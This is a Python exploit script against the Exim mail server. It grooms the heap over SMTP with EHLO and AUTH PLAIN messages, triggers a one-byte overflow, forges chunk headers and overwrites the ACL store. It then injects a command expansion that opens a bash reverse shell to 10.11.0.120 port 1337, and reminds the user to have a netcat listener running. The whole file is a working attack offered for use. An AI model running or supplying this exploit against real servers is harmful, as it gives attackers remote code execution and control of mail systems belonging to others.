#!/usr/bin/python

import time
import socket
import struct
import sys

host = '127.0.0.1'
port = 25

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

f = s.makefile('rw')

def p(v):
	return struct.pack("<Q", v)

def readuntil(delim='\n'):
	data = ''
	while not data.endswith(delim):
		data += f.read(1)
	return data

def write(data):
	f.write(data + '\n')

def ehlo(v):
	write("EHLO " + v)
	readuntil('HELP')

def unrec(v):
	write(v)
	readuntil('command')

def auth_plain(v):
	encode = v.encode('base64').replace('\n', '').replace('=', '')
	write("AUTH PLAIN " + encode)
	readuntil('data')

def one_byte_overwrite():
	v = "C"*8200
	encode = v.encode('base64').replace('\n', '').replace('=', '')
	encode = encode[:-1] + "PE"
	write("AUTH PLAIN " + encode)
	readuntil('data')

# def exploit
print ''
print '[*] exim4 sendmail local/remote buffer overflow module.'
print '[*] usage:  $ python exim.py <target> <port>'
s.connect((host,port))
print '[1] Connected to target...'
time.sleep(1)

ehlo("A"*8000)
ehlo("B"*16)
print ''
print '[2] Free chunk created in unsorted bin.  size: 0x6060'
unrec('\xff'*2000)
ehlo('D'*8200)
one_byte_overwrite()
print ''
print '[3] Triggered 1 byte overwrite extending target chunk from 0x2020 to 0x20f0 !'

fake_header = p(0)
fake_header += p(0x1f51)
auth_plain("E"*176 + fake_header + "E"*(8200-176-len(fake_header)))
print ''
print '[4] Patched chunk with fake header. Extended Chunk can now be freed.'

ehlo("F"*16)
print ''
print '[5] Extended chunk is now free.'

unrec('\xff'*2000)
unrec('\xff'*2000)
print ''
print '[6] 1st and 3rd items in the sort bin now occupied with filler.'

fake_header = p(0x4110)
fake_header = p(0x1f50)
auth_plain("G"*176 + fake_header + "G"*(8200-176-len(fake_header)))
print ''
print '[7] Chunk was patched with fake header. Extended chunk can now be allocated.'

address = 0x55d7e5864480
auth_plain("H"*8200 + p(0x2021) + p(address) + p(0x2008) + "H"*184)
print ''
print '[8] "Next" pointer overwritten with ACL store block address.'

ehlo("I"*16)
print "[9] ACL block store has been freed."

offset = 228
lhost = '10.11.0.120'
lport = 1337
#cmd = sys.argv[3]
cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.11.0.120/1337 0>&1'"
cmd_expansion_string = "${run{"+cmd+"}}\0"
auth_plain("J"*offset + cmd_expansion_string + "J"*(8200 - offset - len(cmd_expansion_string)))
print ''
print '[10] ACL store block has been malloced. acl_smtp_rcpt overwritten with shell cmd.'

write("MAIL FROM:<w00t@sufferance.com>")
readuntil("OK")
write("RCPT TO:<shellz@sufferance.com>")
print ''
print '[SENT!] RCPT TO triggered and running your shell command.'
print '[**] make sure you had a netcat listener on the port you set!!!'

